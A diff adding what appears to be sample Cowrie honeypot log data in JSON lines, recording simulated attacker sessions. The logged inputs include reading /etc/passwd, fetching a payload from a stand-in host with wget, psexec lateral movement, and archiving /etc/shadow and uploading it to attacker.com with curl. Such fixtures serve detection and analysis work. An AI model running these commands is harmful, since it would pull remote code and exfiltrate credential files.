@@ -1,0 +1,9 @@
+{"eventid": "cowrie.session.connect", "src_ip": "192.168.1.50"}
+{"eventid": "cowrie.command.input", "input": "uname -a", "session": "session_001"}
+{"eventid": "cowrie.command.input", "input": "cat /etc/passwd", "session": "session_001"}
+{"eventid": "cowrie.command.input", "input": "wget http://evil-server.test/payload.sh", "session": "session_001"}
+{"eventid": "cowrie.command.input", "input": "chmod +x payload.sh", "session": "session_001"}
+{"eventid": "cowrie.command.input", "input": "sudo su -", "session": "session_002"}
+{"eventid": "cowrie.command.input", "input": "psexec.exe \\\\10.0.0.5 -s cmd.exe", "session": "session_003"}
+{"eventid": "cowrie.session.closed", "session": "session_003"}
+{"eventid": "cowrie.command.input", "input": "tar -czvf backup.tar.gz /etc/shadow && curl -F \"data=@backup.tar.gz\" http://attacker.com/upload", "session": "session_004"}
